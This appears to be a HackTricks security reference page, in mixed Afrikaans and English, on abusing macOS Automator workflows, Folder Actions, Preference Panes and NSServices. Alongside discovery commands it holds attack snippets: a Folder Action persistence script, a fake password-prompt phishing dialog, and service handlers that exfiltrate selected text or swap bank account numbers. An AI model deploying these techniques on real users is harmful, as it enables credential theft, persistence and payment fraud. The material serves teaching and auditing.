# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basiese Inligting

**Automator** is macOS se visuele outomatiseringshulpmiddel. Dit voer **workflows** (`.workflow` bundles) uit wat bestaan uit **actions** (`.action` bundles). Automator dryf ook **Folder Actions**, **Quick Actions**, en **Shortcuts** integrasie aan. Op moderne macOS kan workflows ook in **Shortcuts** ingevoer word, so dieselfde kwaadwillige logika kan verskyn as 'n Finder Quick Action, 'n user service onder `~/Library/Services/`, of 'n shortcut wat deur ou Automator actions ondersteun word.

Automator actions is **plugins** wat in die Automator runtime gelaai word wanneer 'n workflow uitgevoer word. Hulle kan:
- Willekeurige shell scripts uitvoer
- Files en data verwerk
- Met applications via AppleScript interaksie hê
- Saam ketting vir komplekse outomatisering

### Hoekom Dit Belangrik Is

> [!WARNING]
> Automator workflows kan deur **social engineering** laat uitvoer word — hulle lyk soos eenvoudige dokument files. 'n `.workflow` bundle kan embedded shell commands bevat wat uitvoer wanneer die workflow loop. In kombinasie met Folder Actions bied hulle **automatic persistence** wat op file events aktiveer. Onlangse Gatekeeper-regstellings het ook gewys dat **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) as executable content behandel moet word, nie as onskadelike data nie.

### Ontdekking
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Aanval: Sosiaal-Gemanipuleerde Werkvloei

'n `.workflow` bundle lyk vir die meeste gebruikers soos 'n normale dokumentlêer:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Aanval: Folder Action Persistence

Folder Actions voer outomaties ’n workflow uit wanneer lêers by ’n gemonitorde vouer gevoeg word:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions bly oor herlaaiings en voer stilweg uit. ’n Folder Action op `~/Downloads` beteken **elke afgelaaide lêer aktiveer jou payload** — insluitend lêers van Safari, Chrome, AirDrop, en e-posaanhegsels. Let ook daarop dat `System Events` Folder Actions kan registreer wat na scripts buite die verstek `~/Library/Scripts/Folder Action Scripts` liggings wys, wat los-pad-jag die moeite werd maak. Vir verwante TCC-implikasies, kyk [die TCC-bladsy](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) is plugins loaded from **System Settings** (voorheen System Preferences). Hulle verskaf konfigurasie-UI-panele vir stelsel- of derdeparty-funksies. Op ouer stelsels is hulle direk deur `System Preferences` gelaai; op nuwer vrystellings word derdeparty-panele algemeen bemiddel deur ’n **legacy loader XPC service** wat vanaf System Settings begin word.

### Why This Matters

- Preference panes voer uit in ’n **trusted host process** wat deur System Settings / System Preferences gespan word
- Op moderne stelsels kan daardie host ’n **`legacyLoader` XPC service** wees, so die belangrike grens is steeds **trusted Apple UI process -> third-party code loading**
- Derdeparty preference panes erf die **host process security context** en gebruikersvertroue wat aan daardie UI gekoppel is
- Gebruikers installeer preference panes deur **dubbelkliek** daarop te doen — maklike social engineering
- Sodra geïnstalleer, **persist** hulle en laai elke keer wanneer System Settings daardie pane oopmaak

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Aanval: Privilege Context Hijacking

’n Kwaadwillige preference pane erf die **pane host** se sekuriteitskonteks (histories `System Preferences`, op nuwer weergawes dikwels ’n `legacyLoader` helper wat deur `System Settings` geloods word):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Aanval: Volharding via installasie
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Aanval: UI Phishing

'n Preference pane kan wettige stelsel-UI-panele naboots om **geloofsbriewe te phish**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basiese Inligting

**NSServices** laat toepassings toe om funksionaliteit aan ander apps te bied deur die **Services menu** (regsklik → Services). Wanneer ’n gebruiker teks of data kies en ’n service oproep, word die gekose data **na die service provider gestuur** vir verwerking.

Services word in ’n toepassing se `Info.plist` onder die `NSServices` key verklaar en met die pasteboard server (`pbs`) geregistreer. macOS hou ook ’n **service cache** en ’n **restriction policy** by wat besluit watter services sigbaar is en of sandboxed callers ’n ekstra waarskuwing moet ontvang.

### Hoekom Dit Belangrik Is

- Services ontvang **cross-application data flow** — gekose teks van enige toepassing word na die service gestuur
- ’n Kwaadwillige service vang data van password managers, email clients, financial apps
- Services kan **gewysigde data terugstuur** na die roepende toepassing (man-in-the-middle op selection operations)
- Service name kan ontwerp word om legitiem te lyk ("Format Text", "Encrypt Selection", "Share")
- Die opsionele `NSRestricted` vlag is security-relevant: ’n service wat as unrestricted gemerk is, kan deur ’n sandboxed app aangeroep word sonder die waarskuwing wat macOS vir escape-prone services wys

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Aanval: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Aanval: Datawysiging (Man-in-the-Middle)

’n Diens kan die **teruggekeerde data wysig** terwyl dit skynbaar ’n legitieme funksie verskaf:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Beperkte Dienste & Moderne Misbruik

Apple ondersteun ’n opsionele `NSRestricted` booleaanse waarde per diensdefinisie. As dit ingestel is, waarsku macOS sandboxed callers omdat die diens hulle kan help om **sandbox- of privaatheidsgrense te ontsnap**. Vanuit ’n offensiewe perspektief gee dit twee nuttige ouditpaaie:

- Soek na **derdeparty-dienste wat nie as restricted gemerk is nie** al proxy hulle Apple Events, lêertoegang, of ander geprivilegieerde aksies
- Soek na **hoëwaarde ingeboude dienste** met sterk entitlements (byvoorbeeld, dienste blootgestel deur Script Editor of Finder-backed helpers) en kyk of gebruikersinteraksie genoeg is om hulle in ’n data-access primitive te verander

’n Goeie onlangse voorbeeld is **CVE-2022-48574**, waar die Services-meganisme misbruik kon word om **TCC-beskermde gebruikerslêers te bereik sonder die verwagte bevestigingsvloei**. Die fout is reggemaak, maar die tegniek bly nuttig vir threat modeling: enige diens wat lêertoegang of outomatiseringsversoeke namens die caller deurstuur, verdien dieselfde ondersoek.

---

## Onlangse Sekuriteitsnotas

- **Quick Actions is uitvoerbare inhoud**: Apple het in 2024 ’n Gatekeeper-bypass reggemaak waar ’n app-ingeboude Automator Quick Action sonder normale assessering kon hardloop. Wanneer jy apps oudit, inspekteer `Contents/PlugIns/*.workflow/Contents/document.wflow` presies soos jy helper scripts of login items sou inspekteer. Sien [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts kan legacy Automator-gedrag erf**: Apple het ook ’n bykomende user-consent prompt bygevoeg nadat third-party shortcuts gevind is wat ’n **legacy Automator action** gebruik het om Apple Events te stuur sonder die verwagte permission flow. Geïmporteerde workflows en shortcut bundles moet nagegaan word vir `Run AppleScript`, `Run Shell Script`, en soortgelyke bridge actions. Sien [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator is steeds ’n lewende privaatheidsgrens**: Apple het in 2025 nog ’n Automator-fix uitgereik vir toegang tot protected user data. Selfs al is Automator ’n legacy surface, behandel enige workflow runner, Quick Action host, of automation bridge as ’n huidige aanvaloppervlak eerder as dooie kode.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Eskalasie
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Wagwoordbestuurder-diefstal
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Verwysings

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
